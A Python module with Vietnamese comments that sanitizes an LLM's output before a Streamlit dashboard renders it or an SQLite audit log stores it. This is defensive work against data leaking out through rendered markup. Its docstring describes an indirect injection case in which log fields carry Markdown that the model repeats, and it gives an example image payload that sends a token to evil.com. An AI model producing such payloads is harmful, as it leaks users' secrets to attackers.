"""
Bộ làm sạch đầu ra (Output Sanitizer): Phòng thủ rò rỉ dữ liệu (Vector tấn công #04)

MÔ HÌNH MỐI ĐE DỌA (THREAT MODEL):
  Kẻ tấn công chèn payload dạng Markdown/HTML vào log fields (User-Agent, URI).
  Khi LLM reproduce nội dung này trong output, Dashboard render markdown →
  trình duyệt tự động gửi HTTP request đến server kẻ tấn công:

  Ví dụ payload trong log:
    User-Agent: ![x](https://evil.com/steal?token=SECRET_DATA)

  Nếu output không được sanitize, Streamlit sẽ render <img> tag → browser
  gửi GET request kèm data đến evil.com → Data Exfiltration thành công.

GIẢI PHÁP:
  Quét OUTPUT của LLM (không phải input) trước khi:
  1. Hiển thị trên Dashboard (Streamlit)
  2. Ghi vào Audit Trail DB (SQLite)
  
  Strip/neutralize tất cả:
  - Markdown images: ![alt](url)
  - Markdown links: [text](url)  
  - HTML tags: <img>, <a>, <iframe>, <script>, <object>, <embed>
  - Data URIs: data:text/html;base64,...
  - Raw URLs có query params nghi ngờ exfil
"""

import re
import logging

logger = logging.getLogger(__name__)


class OutputSanitizer:
    """
    Sanitize LLM output TRƯỚC khi render trên UI hoặc ghi DB.
    Chống Data Exfiltration via Markdown/HTML rendering.
    """

    # Patterns nguy hiểm trong output
    DANGEROUS_PATTERNS = [
        # Markdown image (exfil vector chính - hỗ trợ khoảng trắng tùy chọn)
        (r'!\[[^\]]*\]\s*\([^\)]+\)', '[IMG_STRIPPED]'),
        # Markdown links to external domains (hỗ trợ khoảng trắng tùy chọn)
        (r'\[[^\]]*\]\s*\(https?://[^\)]+\)', '[LINK_STRIPPED]'),
        # HTML img tags
        (r'<img[^>]*>', '[IMG_STRIPPED]'),
        # Thẻ HTML anchor
        (r'<a\s[^>]*>.*?</a>', '[LINK_STRIPPED]'),
        # Thẻ HTML iframe (nội dung nhúng)
        (r'<iframe[^>]*>.*?</iframe>', '[IFRAME_STRIPPED]'),
        # Thẻ HTML script
        (r'<script[^>]*>.*?</script>', '[SCRIPT_STRIPPED]'),
        # Thẻ HTML object/embed (rò rỉ dựa trên plugin)
        (r'<object[^>]*>.*?</object>', '[OBJECT_STRIPPED]'),
        (r'<embed[^>]*/?>', '[EMBED_STRIPPED]'),
        # Định dạng Data URI (có thể mã hóa mã HTML/JS tùy ý)
        (r'data:[a-zA-Z]+/[a-zA-Z+]+;base64,[A-Za-z0-9+/=]+', '[DATA_URI_STRIPPED]'),
        # Định dạng SVG có khả năng thực thi JavaScript
        (r'<svg[^>]*>.*?</svg>', '[SVG_STRIPPED]'),
        # Thẻ style (rò rỉ dựa trên CSS qua url())
        (r'<style[^>]*>.*?</style>', '[STYLE_STRIPPED]'),
    ]

    def __init__(self):
        self.compiled_patterns = [
            (re.compile(pattern, re.IGNORECASE | re.DOTALL), replacement)
            for pattern, replacement in self.DANGEROUS_PATTERNS
        ]
        self._strip_count = 0

    def sanitize(self, text: str) -> str:
        """
        Làm sạch văn bản đầu ra. Loại bỏ các cấu trúc Markdown/HTML nguy hiểm.
        Trả về văn bản sạch an toàn để hiển thị.
        """
        if not text:
            return text

        clean = text
        self._strip_count = 0

        for compiled_re, replacement in self.compiled_patterns:
            matches = compiled_re.findall(clean)
            if matches:
                self._strip_count += len(matches)
                clean = compiled_re.sub(replacement, clean)

        if self._strip_count > 0:
            logger.warning(
                f"[OUTPUT SANITIZER] Stripped {self._strip_count} dangerous "
                f"patterns from LLM output (potential Data Exfiltration attempt)"
            )

        return clean

    def sanitize_for_db(self, text: str) -> str:
        """
        Sanitize text trước khi ghi vào SQLite.
        Ngoài strip markdown/HTML, còn chặn SQL injection cơ bản.
        """
        clean = self.sanitize(text)
        # Neutralize SQL injection trong text fields
        # (SQLite dùng parameterized queries nên đây là defense-in-depth)
        clean = clean.replace("'", "''")
        return clean

    @property
    def last_strip_count(self) -> int:
        """Số patterns đã bị strip trong lần sanitize gần nhất."""
        return self._strip_count


# Thực thể duy nhất (Singleton)
output_sanitizer = OutputSanitizer()
